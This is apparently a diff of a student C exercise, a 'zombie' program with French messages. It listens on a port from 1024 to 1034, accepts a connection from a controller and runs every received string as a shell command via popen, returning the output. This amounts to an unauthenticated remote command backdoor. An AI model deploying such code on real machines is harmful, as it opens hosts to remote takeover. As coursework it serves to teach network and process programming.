@@ -12,15 +12,12 @@
 #include "utils_v2.h"
 #include "messages.h"
 
-
+// obtenir un port dispo
 int getPort(int minPort, int maxPort) {
-    int sock, port;
+    int sock;
+    int port = randomIntBetween(minPort , maxPort);
     struct sockaddr_in addr;
-    for (port = minPort; port <= maxPort; port++) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) {
-            continue;
-        }
         memset(&addr, 0, sizeof(addr));
         addr.sin_family = AF_INET;
         addr.sin_addr.s_addr = htonl(INADDR_ANY);
@@ -30,7 +27,7 @@ int getPort(int minPort, int maxPort) {
             return port;
         }
         close(sock);
-    }
+    
     return -1;
 }
 
@@ -57,13 +54,11 @@ int createConnection(int port) {
 }
 
 int toArgv(char * commande, char *** arguments) {
-
-
     return 0;
 }
 
 int main() {
-    int port = getPort(1024, 1030);
+    int port = getPort(1024, 1034);
     if (port == -1) {
         printf("Impossible de trouver un port disponible\n");
         return 1;
@@ -73,7 +68,7 @@ int main() {
         printf("Impossible de créer une connexion\n");
         return 1;
     }
-    printf("Le zombie tourne sur ce port   %d...\n", port);
+    printf("Le zombie tourne sur ce port :  %d...\n", port);
     struct sockaddr_in client_addr;
     socklen_t client_addr_len = sizeof(client_addr);
     int client_sock = accept(sock, (struct sockaddr*)&client_addr, &client_addr_len);
@@ -81,6 +76,7 @@ int main() {
         printf("Impossible d'accepter la connexion\n");
         return 1;
     }
+    //printf("conexion zombie temp");
     close(sock);
     char buf[BUF_SIZE];
     int n;
@@ -90,27 +86,27 @@ int main() {
         if (n <= 0) {
             break;
         }
+           //char ** args = NULL;
     
-        printf("Commande reçue par le controlleur : %s\n", buf);
-        FILE * fp = popen(buf, "r");
-        if (fp == NULL) {
-            printf("Erreur lors de l'exécution de la commande\n");
-            continue;
-        }
-        while (1) {
-            n = fread(buf, 1, BUF_SIZE, fp);
-            if (n <= 0) {
-                break;
-            }
-            send(client_sock, buf, n, 0);
-        }
-        pclose(fp);
-
-
-        close(client_sock);
-
-        return 0;
+    printf("Commande reçue par le controlleur : %s\n", buf);
+    FILE * fp = popen(buf, "r");
+    if (fp == NULL) {
+        printf("Erreur lors de l'exécution de la commande\n");
+        continue;
     }
+    while (1) {
+        n = fread(buf, 1, BUF_SIZE, fp);
+        if (n <= 0) {
+            break;
+        }
+        send(client_sock, buf, n, 0);
+    }
+    pclose(fp);
+}
+
+close(client_sock);
+
+return 0;
 }
 
            
